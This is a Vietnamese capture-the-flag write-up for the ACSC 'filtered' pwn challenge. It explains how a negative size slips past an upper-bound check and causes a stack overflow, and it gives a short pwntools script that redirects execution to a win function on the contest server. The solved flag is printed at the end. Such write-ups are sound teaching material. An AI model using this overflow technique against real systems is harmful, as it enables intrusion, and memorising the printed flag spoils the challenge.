# FILTERED

## REVERSE FILE

Kiểm tra một số thông tin cơ bản của file.
```sh
filtered: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f3655fdac42465b5af8a11fda53d47a9c09c0625, for GNU/Linux 3.2.0, not stripped
```
checksec file để xem 1 số cơ chế bảo mật như:
* NX enable: không có quyền execute trên stack.
* No canary found: không có 1 chuỗi ngẫu nhiên gần return address. Dễ dàng buffer overflow.
* No PIE: 1 số địa chỉ trên .bss không đổi.
```sh
[*] '/mnt/c/Users/n18dc/OneDrive/Desktop/ascs/pwn1/filtered'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Bỏ file vào IDA để xem pseudocode
```sh
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[268]; // [rsp+0h] [rbp-110h] BYREF
  int v5; // [rsp+10Ch] [rbp-4h]

  v5 = readint((__int64)"Size: ");
  if ( v5 > 256 )
  {
    print("Buffer overflow detected!\n");
    exit(1);
  }
  readline((__int64)"Data: ", (__int64)v4, v5);
  print("Bye!\n");
  return 0;
}s
```

Bài này cho phép người dùng nhập Size, và kiểm tra giới hạn trên nếu lớn hơn 256 thì thoát, ngược lại cho phép nhập.

Trong challenge có sẵn 1 hàm win, mục tiêu bài nãy sẽ là điều khiển control flow nhảy về hàm này.

## Exploit

Do chương trình chặn trên mà không chặn dưới, mà trong hàm readInt() có sử dụng hàm Atoi(), hàm chuyển một chuỗi về dạng số.
```sh
int __fastcall readint(__int64 a1)
{
  char nptr[16]; // [rsp+10h] [rbp-10h] BYREF

  readline(a1, nptr, 16LL);
  return atoi(nptr);
}
```
Nên việc nhập -1 vào `Size: ` sẽ giúp bỏ qua điều kiện if và dẫn đến việc nhập một chuỗi với size rất lớn.
Sau khi hàm readInt() thì thanh ghi `RAX = 0xffffffffffffffff`, việc kiểm tra điều kiện V5 sẽ nhỏ hơn 256 vì:
```sh
pwndbg> p/d 0xffffffffffffffff
$1 = -1
```
Cùng với việc readline với length = v5, sẽ có thể buffer overflow.

```sh
from pwn import *
#s = process("./filtered")
s = remote("167.99.78.201", 9001)
s.sendline("-1")
s.sendline("A"*280+p64(0x4011d6))
s.interactive()

```
# ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}